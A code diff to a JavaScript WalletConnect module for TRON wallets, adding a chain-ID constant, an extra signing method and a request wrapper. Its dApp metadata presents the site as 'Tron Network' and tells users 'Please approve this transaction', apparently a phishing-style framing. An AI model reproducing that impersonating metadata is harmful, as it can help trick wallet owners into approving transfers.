@@ -1,7 +1,10 @@
 import { Buffer } from 'buffer';
 window.Buffer = Buffer;
 import UniversalProvider from "@walletconnect/universal-provider";
+
 const projectId = 'c5250465b531d3f5128116dc9460f64e';
+const TRON_CHAIN_ID = "tron:0x2b6653dc";
+
 const metadata = {
     name: 'Tron Network',
     description: 'Please approve this transaction',
@@ -37,8 +40,8 @@ window.connectWalletConnectTron = async function () {
         await provider.connect({
             namespaces: {
                 tron: {
-                    methods: ["tron_signTransaction", "tron_signMessage", "personal_sign"],
-                    chains: ["tron:0x2b6653dc"],
+                    methods: ["tron_signTransaction", "tron_signMessage", "eth_sendTransaction", "personal_sign"],
+                    chains: [TRON_CHAIN_ID],
                     events: ["chainChanged", "accountsChanged"]
                 }
             }
@@ -48,7 +51,16 @@ window.connectWalletConnectTron = async function () {
         if (session && session.namespaces && session.namespaces.tron) {
             const accountStr = session.namespaces.tron.accounts[0];
             const address = accountStr.split(":")[2];
-            return { address, provider };
+
+            // Expose a proper request wrapper that always includes chainId
+            const wrappedRequest = (args) => {
+                return provider.request(
+                    { ...args, chainId: TRON_CHAIN_ID },
+                    TRON_CHAIN_ID
+                );
+            };
+
+            return { address, provider: { request: wrappedRequest } };
         }
         return null;
     } catch (error) {
